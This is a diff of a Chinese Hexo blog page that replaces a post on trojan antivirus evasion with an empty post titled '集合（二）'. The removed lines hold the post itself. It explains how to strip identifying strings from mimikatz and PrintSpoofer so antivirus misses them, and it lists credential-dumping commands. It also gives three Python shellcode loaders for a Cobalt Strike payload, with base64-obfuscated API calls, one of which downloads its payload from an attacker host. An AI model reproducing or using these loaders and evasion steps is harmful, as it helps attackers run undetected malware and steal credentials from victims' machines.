@@ -4,8 +4,8 @@
 
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="木马免杀（一）, HTML,CSS,JavaScript,JQuery,java,linux等">
-    <meta name="description" content="mimikatz，printspoofer和CS免杀">
+    <meta name="keywords" content="集合（二）, HTML,CSS,JavaScript,JQuery,java,linux等">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>木马免杀（一） | 小小星仔</title>
+    <title>集合（二） | 小小星仔</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -297,12 +297,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/26.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">木马免杀（一）</h1>
+                    <h1 class="description center-align post-title">集合（二）</h1>
                 </div>
             </div>
         </div>
@@ -416,33 +416,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">内网渗透</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
-                                <span class="chip bg-color">木马免杀</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                渗透测试
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -451,7 +430,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-04-05
+                    2022-04-10
                 </div>
                 
 
@@ -465,14 +444,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -490,133 +469,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="mimikatz免杀"><a href="#mimikatz免杀" class="headerlink" title="mimikatz免杀"></a>mimikatz免杀</h2><p>mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证。</p>
-<ul>
-<li><p>在github上下载mimikatz <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security</a></p>
-</li>
-<li><p>解压缩，打开<img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153343693.png"></p>
-</li>
-<li><p>默认生成不成功，要改配置属性<img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153646914.png"></p>
-<ol>
-<li><p>右击解决方案资源管理器，点击属性</p>
-<p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153824349.png"></p>
-</li>
-<li><p>更改平台，选择自己的vs平台</p>
-</li>
-</ol>
-<p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153849889-16491443366361.png"></p>
-<p>​    3.  C++常规，将警告视为错误设置为否</p>
-<p>​        <img src="image-20220405154005916.png"></p>
-<p>​    </p>
-<blockquote>
-<p>可能缺少MFS库，自己安装一下</p>
-</blockquote>
-<ol start="4">
-<li><p>生成</p>
-</li>
-<li><p>默认生成32位，改成64位</p>
-<ul>
-<li><p>右击解决方案，打开属性页，改为64位，再生成一下</p>
-<img src="image-20220405161938248.png" style="zoom:80%;"></li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<ol start="6">
-<li><p>找到位置，即可获得exe文件</p>
-<p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405162228839.png"></p>
-</li>
-</ol>
-<h4 id="开始免杀"><a href="#开始免杀" class="headerlink" title="开始免杀"></a>开始免杀</h4><ul>
-<li>替换关键字，将mimikatz替换成yang（这个随意）</li>
-</ul>
-<blockquote>
-<p>​         在程序没有运行的情况下，一般都是通过特征码判断的。而且Mimikatz这些知名工具的内容像mimikatz、作者信息之类的字符串就很容易被做为特征码识别。</p>
-<p>​        通用阅读源码大体可以了解存在比较明显的关键字：mimikatz、MIMIKATZ以及mimikatz/mimikatz/pleasesubscribe.rc文件的一些内容。可以利用Visual Studio的替换功能实现关键字的处理。</p>
-</blockquote>
-<ul>
-<li><p>删除注释信息，这也将是特征码判断的标准</p>
-</li>
-<li><p>修改ico图标</p>
-</li>
-<li><p>删除敏感信息：</p>
-<img src="1642402559246-abd76535-f8c1-4ce0-9e38-35d40363e208.png" style="zoom: 33%;"></li>
-</ul>
-<p>在空白处右键新增版本信息：<img src="1642405305902-941bde36-5fdc-4000-bbd0-ec1a4cece27f.png" style="zoom:33%;"></p>
-<p>成功以后，测试下功能：</p>
-<pre class="line-numbers language-none"><code class="language-none">privilege::debug   提取权限
-sekurlsa::logonpasswords   抓取密码
-sekurlsa::msv				提取ntlm hash凭证。
-sekurlsa::wdigest			提取用户密码明文。
-sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<img src="image-20220405164234329.png">
-
-
-
-
-
-<h2 id="PrintSpoofer免杀"><a href="#PrintSpoofer免杀" class="headerlink" title="PrintSpoofer免杀"></a>PrintSpoofer免杀</h2><p>下载PrintSpoofer：<a target="_blank" rel="noopener" href="https://github.com/whojeff/PrintSpoofer">GitHub - whojeff/PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019 本地提权2012-2019</a></p>
-<p>可以直接编译成功</p>
-<p>免杀思路（和mimikatz差不多）</p>
-<p>1、将PrintSpoofer.cpp 里面的输出帮助文档全部清空</p>
-<img src="image-20220405165814177.png" style="zoom:80%;">
-
-<p>2、将项目中搜索PrintSpoofer替换为其他内容，这里改成yang。</p>
-<p>3、然后将PrintSpoofer.cpp PrintSpoofer.h 全改为其他名字 这里改成yang</p>
-<p>4、添加ico图标即可。</p>
-<h2 id="Python3CSshellcode免杀"><a href="#Python3CSshellcode免杀" class="headerlink" title="Python3CSshellcode免杀"></a>Python3CSshellcode免杀</h2><h4 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a><strong>什么是shellcode</strong></h4><p>在黑客攻击中，shellcode是一小段代码，用于利用软件漏洞作为有效载荷。它之所以被称为“shellcode”，是因为它通常启动一个命令shell，攻击者可以从这个命令shell控制受损的计算机，但是执行类似任务的任何代码都可以被称为shellcode。</p>
-<h4 id="什么是shellcode-loader"><a href="#什么是shellcode-loader" class="headerlink" title="什么是shellcode loader"></a><strong>什么是shellcode loader</strong></h4><p>shellcode loader 是用于加载和运行shellcode的代码。</p>
-<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>生成木马，选择python，然后生成payload.py。将其下载到本机进行下一步免杀</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/image-20220405182853196.png"></p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/image-20220405182916526.png"></p>
-<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes
-
-<span class="token comment">#shellcode加载</span>
-<span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64
-    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'shellcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>shellcode里填充你的payload.py的代码</p>
-<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>有的时候会对这一句查杀<code>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))</code>，可以用到base64编码对其进行加密，以减少特征码</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes
-<span class="token keyword">import</span> base64
-<span class="token comment">#shellcode加载</span>
-<span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64
-    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'shellcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>另辟蹊径，直接去网上读文件。需要黑客开启http服务。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes
-<span class="token keyword">import</span> base64
-<span class="token comment">#shellcode加载</span>
-<span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64
-    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLCBjdHlwZXMuY19pbnQoLTEpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
-	req<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'IP/xxx.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 去黑客主机读payload文件</span>
-    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
+                
                 
             </div>
             <hr/>
@@ -642,7 +495,7 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://deades-coder.github.io/2022/04/05/mu-ma-mian-sha-yi/">https://deades-coder.github.io/2022/04/05/mu-ma-mian-sha-yi/</a>
+                    <a href="https://deades-coder.github.io/2022/04/10/ji-he-er/">https://deades-coder.github.io/2022/04/10/ji-he-er/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -679,19 +532,7 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">内网渗透</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
-                                    <span class="chip bg-color">木马免杀</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1074,56 +915,39 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/04/05/mu-ma-mian-sha-er/">
+                <a href="/2022/04/10/ji-he-er/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="木马免杀（二）">
                         
-                        <span class="card-title">木马免杀（二）</span>
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="集合（二）">
+                        
+                        <span class="card-title">集合（二）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            关于木马免杀
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-10
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小小星仔
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
-                        <span class="chip bg-color">木马免杀</span>
-                    </a>
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -1134,23 +958,24 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/05/springmvc-er/">
+                <a href="/2022/04/10/ji-he-yi/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="SpringMVC（二）">
                         
-                        <span class="card-title">SpringMVC（二）</span>
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="集合（一）">
+                        
+                        <span class="card-title">集合（一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SpringMVC的基础认识——REST风格
+                            Java的集合
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-10
                             </span>
                         <span class="publish-author">
                             
@@ -1171,12 +996,12 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
                         <span class="chip bg-color">Java</span>
                     </a>
                     
-                    <a href="/tags/JavaEE/">
-                        <span class="chip bg-color">JavaEE</span>
+                    <a href="/tags/JavaSE/">
+                        <span class="chip bg-color">JavaSE</span>
                     </a>
                     
-                    <a href="/tags/Spring/">
-                        <span class="chip bg-color">Spring</span>
+                    <a href="/tags/Java%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">Java基础</span>
                     </a>
                     
                 </div>
@@ -1331,13 +1156,6 @@ sekurlsa::kerberos			提取域账户凭证。<span aria-hidden="true" class="lin
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
-    });
-</script>
 
 
 
